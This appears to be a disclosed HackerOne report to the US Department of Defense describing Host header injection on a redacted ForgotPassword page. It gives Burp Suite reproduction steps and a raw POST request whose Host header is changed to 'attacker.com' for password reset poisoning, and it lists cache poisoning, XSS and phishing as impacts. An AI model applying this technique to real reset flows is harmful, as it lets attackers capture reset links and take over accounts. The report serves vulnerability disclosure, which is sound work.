# Host Header Injection on https://███/████████/Account/ForgotPassword

## Report Details
- **Report ID**: 1679969
- **URL**: https://hackerone.com/reports/1679969
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2022-08-25T11:29:54.609Z
- **Disclosed**: 2022-10-14T18:03:18.258Z

## Reporter
- **Username**: 696e746c6f6c
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
Dear DoD Team,

I found one high bug on your another domain. This is from Hack US Program. Affected domain is https://█████/

An attacker can manipulate the Host header as seen by the web application and cause the application to behave in unexpected ways.
Very often multiple websites are hosted on the same IP address. This is where the Host Header comes in. This header specifies which website should process the HTTP request. The web server uses the value of this header to dispatch the request to the specified website. Each website hosted on the same IP address is called a virtual host. And It's possible to send requests with arbitrary Host Headers to the first virtual host.

Here's the PoC btw:

███

Thank you DoD!

## Impact

Tampering of Host header can lead to the following attacks:
1) Web Cache Poisoning-Manipulating caching systems into storing a page generated with a malicious Host and serving it to others.
2) Password Reset Poisoning-Exploiting password reset emails and tricking them to deliver poisoned content directly to the target.
3) Cross Site Scripting - XSS can be performed, if the value of Host header is used for writing links without HTML-encoding. For example Joomla used to write Host header to every page without HTML Encoding like this: <link href=”http://_SERVER['HOST']”> which led to cross site scripting.
4) Access to internal hosts-To access internal hosts.
5.) It can also lead to Phishing Attacks.

## System Host(s)
███████

## Affected Product(s) and Version(s)
Users are affected

## CVE Numbers


## Steps to Reproduce
1. Go to this domain: https://███/████████/
2. Go to vendor login.
3. Create a test account.
4. Go to Forgot Password Reset: https://████/██████/Account/ForgotPassword
5. Before inserting your email. 
6. Turn your foxy proxy on.
7. Open your burp suite and go to http history tab.
8. Now insert your email.
9. In http history in burp you will see this request:

```javascript
POST /████████/Account/ForgotPassword HTTP/1.1
Host: ███
Cookie: .AspNetCore.Antiforgery.wZhPOrJ1UhI=; TS014b77bb=; ASP.NET_SessionId=; TS0144f203=; CSRF-TOKEN=
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: hr,hr-HR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json
X-Csrf-Token: 
X-Requested-With: XMLHttpRequest
Content-Length: 35
Origin: https://███████
Referer: https://████/█████████/Account/ForgotPassword
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

{"Email":"███████"}
```
10. Send this request to repeater tab.
11. Change Host headet to attacker.com
12. It shoud look like this:

```javascript
POST /████████/Account/ForgotPassword HTTP/1.1
Host: attacker.com
Cookie: .AspNetCore.Antiforgery.wZhPOrJ1UhI=; TS014b77bb=; ASP.NET_SessionId=; TS0144f203=; CSRF-TOKEN=
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: hr,hr-HR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json
X-Csrf-Token: 
X-Requested-With: XMLHttpRequest
Content-Length: 35
Origin: https://████
Referer: https://███████/████/Account/ForgotPassword
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close
```
13. Now send request and you will get 200 OK response.
14. Go to your mail/gmail.
15. You will see some magic.
16. PoC is down there.

## Suggested Mitigation/Remediation Actions




## Attachments
No attachments
